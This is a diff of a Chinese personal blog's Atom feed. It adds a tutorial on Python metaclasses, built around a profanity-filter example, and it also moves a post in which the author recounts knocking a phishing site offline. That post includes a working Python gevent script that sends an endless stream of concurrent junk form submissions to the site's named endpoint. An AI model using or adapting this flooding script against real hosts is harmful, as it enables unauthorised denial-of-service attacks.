@@ -4,7 +4,7 @@
   <subtitle><![CDATA[不忌讳空山无人，不害怕遥望星辰]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://hsfzxjy.github.io/"/>
-  <updated>2015-12-19T12:52:31.126Z</updated>
+  <updated>2016-02-10T14:28:08.383Z</updated>
   <id>http://hsfzxjy.github.io/</id>
   
   <author>
@@ -13,6 +13,121 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[Python “黑魔法” 之 Meta Classes]]></title>
+    <link href="http://hsfzxjy.github.io//meta-class-in-python/"/>
+    <id>http://hsfzxjy.github.io//meta-class-in-python/</id>
+    <published>2016-02-09T16:00:00.000Z</published>
+    <updated>2016-02-10T14:28:08.383Z</updated>
+    <content type="html"><![CDATA[<p>接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在<code>models.py</code>中随便定义一个<code>Model</code>的子类，Django 便可以：</p>
+<ul>
+<li>获取它的字段定义，并转换成表结构</li>
+<li>读取<code>Meta</code>内部类，并转化成相应的配置信息。对于特殊的<code>Model</code>（如<code>abstract</code>、<code>proxy</code>），还要进行相应的转换</li>
+<li>为没有定义<code>objects</code>的<code>Model</code>加上一个默认的<code>Manager</code></li>
+</ul>
+<p>开发之余，我也曾脑补过其背后的原理。曾经，我认为是这样的：</p>
+<blockquote>
+<p>启动时，遍历<code>models.py</code>中的所有属性，找到<code>Model</code>的子类，并对其进行上述的修改。</p>
+</blockquote>
+<p>当初，我还以为自己触碰到了真理，并曾将其应用到实际生产中——为 SAE 的 KVDB 写了一个类 ORM 系统。然而在实现的过程中，我明显感受到了这种方法的丑陋，而且性能并不出色（因为要遍历所有的定义模块）。</p>
+<p>那么事实上，Django 是怎么实现的呢？</p>
+<blockquote>
+<p>自古以来我们制造东西的方法都是“自上而下”的，是用切削、分割、组合的方法来制造。然而，生命是自下而上地，自发地建造起来的，这个过程极为低廉。<br><cite>——王晋康 《水星播种》</cite></p>
+</blockquote>
+<p>这句话揭示了生命的神奇所在：<strong>真正的生命都是由基本物质自发构成的，而非造物主流水线式的加工</strong>。</p>
+<p>那么，如果 类 也有生命的话，对它自己的修饰就不应该由调用者来完成，而应该是<strong>自发的</strong>。</p>
+<p>幸而，python 提供了造物主的接口——这便是 Meta Classes，或者称为“元类”。</p>
+<a id="more"></a>
+<h2 id="元类_是什么？">元类 是什么？</h2><p>简单说：元类就是<strong>类的类</strong>。</p>
+<p>首先，要有一个概念：</p>
+<h3 id="python_中，一切都是对象。">python 中，一切都是对象。</h3><p>没错，一切，包括 类 本身。</p>
+<p>既然，类 是 对象，对象 是 类的实例，那么——类 也应该有 类 才对。</p>
+<h3 id="类的类：type">类的类：type</h3><p>在 python 中，我们可以用<code>type</code>检测一个对象的类，如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> type(<span class="number">1</span>) <span class="comment"># &lt;type 'int'&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果对一个类操作呢？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> type(int) <span class="comment"># &lt;type 'type'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(MyClass) <span class="comment"># &lt;type 'type'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> type(type) <span class="comment"># &lt;type 'type'&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这说明：<code>type</code>其实是一个类型，所有类——包括<code>type</code>自己——的类都是<code>type</code>。</p>
+<h3 id="type_简介">type 简介</h3><p>从 <a href="https://docs.python.org/2/library/functions.html#type" target="_blank" rel="external">官方文档</a> 中，我们可以知道：</p>
+<ul>
+<li>和 <code>dict</code> 类似，<code>type</code> 也是一个工厂构造函数，调用其将返回 一个<code>type</code>类型的实例（即 类）。</li>
+<li><p><code>type</code> 有两个重载版本：</p>
+<ul>
+<li><code>type(object)</code>，即我们最常用的版本。</li>
+<li><p><code>type(name, bases, dict)</code>，一个更强大的版本。通过指定 类名称（<code>name</code>）、父类列表（<code>bases</code>）和 属性字典（<code>dict</code>） 动态合成一个类。</p>
+<p>下面两个语句等价：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Integer</span><span class="params">(int)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">'my integer'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">increase</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------</span></span><br><span class="line"></span><br><span class="line">Integer = type(<span class="string">'Integer'</span>, (int, ), &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'my integer'</span>,</span><br><span class="line">    <span class="string">'increase'</span>: <span class="keyword">lambda</span> self, num: \</span><br><span class="line">                    num + <span class="number">1</span>    <span class="comment"># 很酷的写法，不是么</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p>也就是说：<strong>类的定义过程，其实是<code>type</code>类型实例化的过程</strong>。</p>
+<p><strong>然而这和修饰一个已定义的类有什么关系呢？</strong></p>
+<p>当然有啦～既然“类的定义”就是“<code>type</code>类型的初始化过程”，那其中必定会调用到<code>type</code>的构造函数(<code>__new__()</code> 或 <code>__init__()</code>)。只要我们继承 <code>type</code>类 并修改其 <code>__new__</code>函数，在这里面动手脚就可以啦。</p>
+<p>接下来我们将通过一个栗子感受 python 的黑魔法，不过在此之前，我们要先了解一个语法糖。</p>
+<h3 id="__metaclass___属性">__metaclass__ 属性</h3><p>有没觉得上面第二段示例有些鬼畜呢？它勒令程序员将类的成员写成一个字典，简直是反人类。如果我们真的是要通过修改 元类 来改变 类 的行为的话，似乎就必须采用这种方法了～～简直可怕～～</p>
+<p>好在，<a href="https://docs.python.org/2/reference/datamodel.html?#__metaclass__" target="_blank" rel="external">python 2.2</a> 时引进了一个语法糖：<code>__metaclass__</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Integer</span><span class="params">(int)</span>:</span></span><br><span class="line"></span><br><span class="line">    __metaclass__ = IntMeta</span><br></pre></td></tr></table></figure>
+<p>现在将会等价于：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer = IntMeta(<span class="string">'Integer'</span>, (int, ), &#123;&#125;)</span><br></pre></td></tr></table></figure>
+<p>由此一来，我们在使用传统类定义的同时，也可以使用元类啦。</p>
+<h3 id="栗子：子类净化器">栗子：子类净化器</h3><blockquote>
+<h4 id="需求描述">需求描述</h4><p>你是一个有语言洁癖的开发者，平时容不得别人讲一句脏话，在开发时也是如此。现在，你写出了一个非常棒的框架，并马上要将它公之于众了。不过，你的强迫症又犯了：如果你的使用者在代码中写满了脏话，怎么办？岂不是玷污了自己的纯洁？</p>
+</blockquote>
+<p>假如你就是这个丧心病狂的开发者，你会怎么做？</p>
+<p>在知道元类之前，你可能会无从下手。不过，这个问题你可以用 元类 轻松解决——只要在类定义时过滤掉不干净的字眼就好了（百度贴吧的干活～～）。</p>
+<p>我们的元类看起来会是这样的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sensitive_words_list = [<span class="string">'asshole'</span>, <span class="string">'fuck'</span>, <span class="string">'shit'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect_sensitive_words</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">'''检测敏感词汇'''</span></span><br><span class="line">    words_detected = filter(<span class="keyword">lambda</span> word: word <span class="keyword">in</span> string.lower(), sensitive_words_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> words_detected:</span><br><span class="line">        <span class="keyword">raise</span> NameError(<span class="string">'Sensitive words &#123;0&#125; detected in the string "&#123;1&#125;".'</span> \</span><br><span class="line">            .format(</span><br><span class="line">                <span class="string">', '</span>.join(map(<span class="keyword">lambda</span> s: <span class="string">'"%s"'</span> % s, words_detected)),</span><br><span class="line">                string</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CleanerMeta</span><span class="params">(type)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, class_name, bases, attrs)</span>:</span></span><br><span class="line">        detect_sensitive_words(class_name) <span class="comment"># 检查类名</span></span><br><span class="line">        map(detect_sensitive_words, attrs.iterkeys()) <span class="comment"># 检查属性名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Well done! You are a polite coder!"</span> <span class="comment"># 如无异常，输出祝贺消息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> super(CleanerMeta, cls).__new__(cls, class_name, bases, attrs)</span><br><span class="line">        <span class="comment"># 重要！这行一定不能漏！！这回调用内建的类构造器来构造类，否则定义好的类将会变成 None</span></span><br></pre></td></tr></table></figure>
+<p>现在，只需这样定义基类：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIBase</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    __metaclass__ = CleanerMeta</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+<p>那么所有 <code>APIBase</code> 的派生类都会接受安全审查（奸笑～～）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImAGoodBoy</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    a_polite_attribute = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] Well done! You are a polite coder!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FuckMyBoss</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] NameError: Sensitive words "fuck" detected in the string "FuckMyBoss".</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PretendToBePolite</span><span class="params">(APIBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__fuck_your_asshole</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Output] NameError: Sensitive words "asshole", "fuck" detected in the string "_PretendToBePolite__fuck_your_asshole".</span></span><br></pre></td></tr></table></figure>
+<p>看，即使像最后一个例子中的私有属性也难逃审查，因为它们本质都是相同的。</p>
+<p>甚至，你还可以对有问题的属性进行偷偷的修改，比如 让不文明的函数在调用时打出一行警告 等等，这里就不多说了。</p>
+<h3 id="元类_在实际开发中的应用">元类 在实际开发中的应用</h3><p>日常开发时，元类 常用吗？</p>
+<p>当然，Django 的 ORM 就是一个例子，大名鼎鼎的 SQLAlchemy 也用了这种黑魔法。</p>
+<p>此外，在一些小型的库中，也有 元类 的身影。比如 <code>abc</code>（奇怪的名字～～）——这是 python 的一个内建库，用于模拟 抽象基类（Abstract Base Classes）。开发者可以使用 <code>abc.abstractmethod</code> 装饰器，将 指定了 <code>__metaclass__ = abc.ABCMeta</code> 的类的方法定义成 抽象方法，同时这个类也成了 抽象基类，抽象基类是不可实例化的。这便实现了对 抽象基类 的模拟。</p>
+<p>倘若你也有需要动态修改类定义的需求，不妨也试试这种“黑魔法”。</p>
+<h3 id="小结">小结</h3><ul>
+<li>类 也是 对象，所有的类都是<code>type</code>的实例</li>
+<li>元类（Meta Classes）是类的类</li>
+<li><code>__metaclass__ = Meta</code> 是 <code>Meta(name, bases, dict)</code> 的 语法糖</li>
+<li>可以通过重载元类的 <code>__new__</code> 方法，修改 类定义 的行为</li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>接触过 Django 的同学都应该十分熟悉它的 ORM 系统。对于 python 新手而言，这是一项几乎可以被称作“黑科技”的特性：只要你在<code>models.py</code>中随便定义一个<code>Model</code>的子类，Django 便可以：</p>
+<ul>
+<li>获取它的字段定义，并转换成表结构</li>
+<li>读取<code>Meta</code>内部类，并转化成相应的配置信息。对于特殊的<code>Model</code>（如<code>abstract</code>、<code>proxy</code>），还要进行相应的转换</li>
+<li>为没有定义<code>objects</code>的<code>Model</code>加上一个默认的<code>Manager</code></li>
+</ul>
+<p>开发之余，我也曾脑补过其背后的原理。曾经，我认为是这样的：</p>
+<blockquote>
+<p>启动时，遍历<code>models.py</code>中的所有属性，找到<code>Model</code>的子类，并对其进行上述的修改。</p>
+</blockquote>
+<p>当初，我还以为自己触碰到了真理，并曾将其应用到实际生产中——为 SAE 的 KVDB 写了一个类 ORM 系统。然而在实现的过程中，我明显感受到了这种方法的丑陋，而且性能并不出色（因为要遍历所有的定义模块）。</p>
+<p>那么事实上，Django 是怎么实现的呢？</p>
+<blockquote>
+<p>自古以来我们制造东西的方法都是“自上而下”的，是用切削、分割、组合的方法来制造。然而，生命是自下而上地，自发地建造起来的，这个过程极为低廉。<br><cite>——王晋康 《水星播种》</cite></p>
+</blockquote>
+<p>这句话揭示了生命的神奇所在：<strong>真正的生命都是由基本物质自发构成的，而非造物主流水线式的加工</strong>。</p>
+<p>那么，如果 类 也有生命的话，对它自己的修饰就不应该由调用者来完成，而应该是<strong>自发的</strong>。</p>
+<p>幸而，python 提供了造物主的接口——这便是 Meta Classes，或者称为“元类”。</p>]]>
+    
+    </summary>
+    
+      <category term="Meta Classes" scheme="http://hsfzxjy.github.io/tags/Meta-Classes/"/>
+    
+      <category term="python" scheme="http://hsfzxjy.github.io/tags/python/"/>
+    
+      <category term="元编程" scheme="http://hsfzxjy.github.io/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="黑魔法" scheme="http://hsfzxjy.github.io/tags/%E9%BB%91%E9%AD%94%E6%B3%95/"/>
+    
+      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[诗集]]></title>
@@ -429,45 +544,6 @@
   </entry>
   
   <entry>
-    <title><![CDATA[记一次 DoS 诈骗网站的经历]]></title>
-    <link href="http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/"/>
-    <id>http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/</id>
-    <published>2015-07-23T16:00:00.000Z</published>
-    <updated>2015-11-08T08:40:30.149Z</updated>
-    <content type="html"><![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
-<blockquote>
-<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target="_blank" rel="external">wap.abchyd.com</a> 进行领取！【农业银行】</p>
-</blockquote>
-<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>
-<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>
-<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>
-<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>
-<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>
-<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>
-<p>简单地谢了一个脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent.monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib2, urllib</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">()</span>:</span></span><br><span class="line">    id = str(uuid1())[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib2.urlopen(<span class="string">'http://www.abchyd.com/add_1.asp'</span>, urllib.urlencode(&#123;</span><br><span class="line">            <span class="string">'logonCardNum'</span>: id,</span><br><span class="line">            <span class="string">'netType'</span>: <span class="string">'111111'</span>,</span><br><span class="line">            <span class="string">'tel'</span>: <span class="string">'12345678900'</span>,</span><br><span class="line">            <span class="string">'randomId'</span>: <span class="string">'1234'</span></span><br><span class="line">        &#125;))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id, <span class="string">'ok'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    gevent.joinall([gevent.spawn(fuck) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)])</span><br></pre></td></tr></table></figure>
-<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>
-<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>
-<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>
-<p>两个小时后。</p>
-<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>
-<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>
-<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>
-<p>真正的网络攻防战，远不止如此。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
-<blockquote>
-<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target=]]>
-    </summary>
-    
-      <category term="安全" scheme="http://hsfzxjy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[Wisecity 商赛总结——也谈前端自动化测试]]></title>
     <link href="http://hsfzxjy.github.io//wisecity-conclusion/"/>
     <id>http://hsfzxjy.github.io//wisecity-conclusion/</id>
@@ -512,6 +588,45 @@
       <category term="前端自动化测试，总结" scheme="http://hsfzxjy.github.io/tags/%E5%89%8D%E7%AB%AF%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%80%BB%E7%BB%93/"/>
     
       <category term="单元测试" scheme="http://hsfzxjy.github.io/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[记一次 DoS 诈骗网站的经历]]></title>
+    <link href="http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/"/>
+    <id>http://hsfzxjy.github.io//how-to-fuck-a-bilk-site/</id>
+    <published>2015-07-23T16:00:00.000Z</published>
+    <updated>2016-02-02T13:30:35.450Z</updated>
+    <content type="html"><![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
+<blockquote>
+<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target="_blank" rel="external">wap.abchyd.com</a> 进行领取！【农业银行】</p>
+</blockquote>
+<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>
+<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>
+<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>
+<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>
+<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>
+<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>
+<p>简单地写了一个脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent.monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib2, urllib</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">()</span>:</span></span><br><span class="line">    id = str(uuid1())[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib2.urlopen(<span class="string">'http://www.abchyd.com/add_1.asp'</span>, urllib.urlencode(&#123;</span><br><span class="line">            <span class="string">'logonCardNum'</span>: id,</span><br><span class="line">            <span class="string">'netType'</span>: <span class="string">'111111'</span>,</span><br><span class="line">            <span class="string">'tel'</span>: <span class="string">'12345678900'</span>,</span><br><span class="line">            <span class="string">'randomId'</span>: <span class="string">'1234'</span></span><br><span class="line">        &#125;))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id, <span class="string">'ok'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    gevent.joinall([gevent.spawn(fuck) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)])</span><br></pre></td></tr></table></figure>
+<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>
+<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>
+<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>
+<p>两个小时后。</p>
+<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>
+<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>
+<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>
+<p>真正的网络攻防战，远不止如此。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
+<blockquote>
+<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target=]]>
+    </summary>
+    
+      <category term="安全" scheme="http://hsfzxjy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
     
       <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
     
@@ -793,37 +908,6 @@
   </entry>
   
   <entry>
-    <title><![CDATA[如何备份apt-get已安装的软件列表？]]></title>
-    <link href="http://hsfzxjy.github.io//backup-apt-get/"/>
-    <id>http://hsfzxjy.github.io//backup-apt-get/</id>
-    <published>2015-04-18T16:00:00.000Z</published>
-    <updated>2015-11-08T10:07:09.289Z</updated>
-    <content type="html"><![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的操作系统。</p>
-<p>但，如果有一天，系统需要被重装——或是无可救药了，抑或是购置了新的设备，问题来了：</p>
-<blockquote>
